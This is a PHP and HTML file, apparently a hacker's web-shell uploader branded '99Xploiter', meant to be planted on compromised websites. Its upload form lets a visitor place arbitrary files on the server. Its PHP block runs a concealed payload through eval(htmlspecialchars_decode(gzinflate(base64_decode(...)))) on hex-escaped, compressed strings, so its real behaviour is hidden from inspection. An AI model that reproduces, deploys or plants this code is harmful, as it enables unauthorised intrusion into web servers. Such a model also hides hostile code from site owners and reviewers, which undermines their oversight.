
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">

    <meta name="theme-color" content="#000">
    
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="S1XT33N">
    <link href="https://fonts.googleapis.com/css?family=Acme|Sriracha|Iceland" rel="stylesheet">
    <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ4glXFVVc6UNkApzimxcH2fXEdvDeb2IjLvw&usqp=CAU" type="image/jpg">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css'>
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> 
	<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
	<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
    <title>UPLOADER 99Xploiter</title>
    <style>
    	body{background : gray; background-image: url(http://3.bp.blogspot.com/-GaLf17GTJSY/VBfS0rS4vAI/AAAAAAAAES8/eaW3b326Yus/s1600/monozcore_petir.gif); 
    </style>
  
  </head>
  <body>
    <div class="container text-center mx-auto"> 	

    <br>
    <div class="container text-center">
    	<font face="iceland" Size="6" color="white"><b>99-Xploiter uploader</b></font><br>
    	<center><img src="https://camo.githubusercontent.com/b5ef73c95e213cf2c20a06fd1d9db1d4e36b5ee6ff6cd6fd7aeaddc8f918603f/68747470733a2f2f6769746875622d726561646d652d73746174732e76657263656c2e6170702f6170692f746f702d6c616e67733f757365726e616d653d70656c657270616e6a616e67266c616e67735f636f756e743d31302673686f775f69636f6e733d74727565266c6f63616c653d656e266c61796f75743d636f6d70616374267468656d653d616c676f6c6961" height="200" width="200" /></center>
    	<br><br>
    	<form method="post" enctype="multipart/form-data">
    		<div class="row">
    			<div class="col">
    				<input id="previews" placeholder="Pilih File" class="form-control bg-transparent text-white" readonly="readonly">
    			</div>
    			
    			<div class="col">
    				<div class="input-group">
    					<div class="custom-file">
    						<input type="file" name="randsx" class="custom-file-input bg-transparent" id="FileSel">
    						<label class="custom-file-label bg-transparent" for="previews"></label>
    					</div>
    				</div>
    			</div>
    		</div>
    		<button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load" data-loading-text="<i class='fa fa-refresh fa-spin'></i> Silahkan Tunggu Sebentar "><b>Upload</b></button>
    	</form><hr>
      					
<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x3do\x61yXN\x61j\x43jDh\x41s77RL5sH\x435HwT1/\x62POpLot4s\x62Pei\x63S\x61w\x2bzyyk5lU18985nPMMLo\x43y\x61v\x420v0oLEtL\x62fz4uG\x61id5oS9OF6VIIm\x61Sp60kSuMvkHluvj6nWLD\x41\x63ooFj/SSsiVqV/sRp7UmkoQrrT\x61\x615jwmjXXXUXSDFv\x63unIY\x62\x61vM\x2btn4ld\x42Mqen\x432E3mrPu7dGUydl\x41ySIT8S\x62\x62ZIkqQ\x62HeGz/jtYTGk0m6yd\x2bv/5FPu7DLxZQLt9hm\x2bo\x631PF8ufhJvmjegt4EskJk\x62wZ1mqmZjwReu/d4\x63Xr4TJEpEOv0\x62\x62iJWI5Ur9DTomVzwOPJFv\x2bwyWqR\x2blvtIqoNNRDZutzdd0I\x61z2zMxz9iEsG8FUqlGJODKkR\x2bTpSnisuy56\x429dR1/\x63R\x41K\x61dhmuIrkSDZEhgp\x61zEjQlmjOP50\x43d3s\x622I2RroikSZMGhUf2zPnYxXI16SMNOXZYz1YuJMDIXX\x43\x62kzzOf5kth\x63T8ygp4M\x42iK91l6xqq6rYFugoJOz7\x41X75TD7/62tJV\x62O\x62o08Dpwd3NHhJ\x63WsoWJ\x42roqwE\x2bH9forEE81NjIdn1\x42W/MYn9m49Wx\x61qSK7DsU/6V0qQ\x43KrSYlyKV2v\x41k5OdDVqN83re9NyXQr\x63MKuzs0g/E\x61VNkT\x43mqlhsM\x43etLStxSlI3HijydJ\x2b2Vl\x411Jniq84rejGq\x62dt\x41\x439YDeUsKpldRTXMwYyIE\x42f0UMqz4gKlzxi8mqgEO5w/P/24rO1zpopSm3Fuln\x42\x63gOLgk0\x61WIl6U\x63gOZkdw\x61KiErLZFKe9QSv8n\x42YhOlxzO\x41\x43KtpOkjv8YsWDG/xY0xO1FFxd8l9G6j\x2b\x2bk4oM\x2bgK\x61euN9V75/qkteIPk2KPNpoMDw7L\x61I1fJ296hNO1JXjXjs7KxnSsKEY\x61mmqGjug192\x43vpWGy\x61dmO8\x429M52\x62\x63\x41u\x62demkntVGzEQ/\x2bwrFt/wgySKuT9ENh\x630\x62Ovm\x41Xm7pD0doMfD\x61yDXvGtQPd\x42vZ/n0IGyFuzNsK1krJFSRMG\x43/oRsW0iuj8or\x62f\x420uSGeSXiK1dlVldsu/\x42i\x2bLTSz4\x428jerJuxe5LN\x61e\x62EZFM6yHEG0gXZ6jU7W\x2b7z/H/5h6ovs6oH\x2bp04ygU0sikLte8VUxpLt\x63z55\x63O7XO\x2bV\x43Fuh\x2bVK\x42U7v\x2bt\x2bYeEixZSZDY7RkpSrpOwo9KxLkVtQhrg2NdKyqHUyLM1h\x2bXKT\x2bThO\x61/W\x62V1I/ZOgZ\x42wJe874\x41xF\x41/JOgd\x42wJe873\x41\x42G\x41/5Ngh\x42wJe872\x41RG\x41/pNgl\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;
?>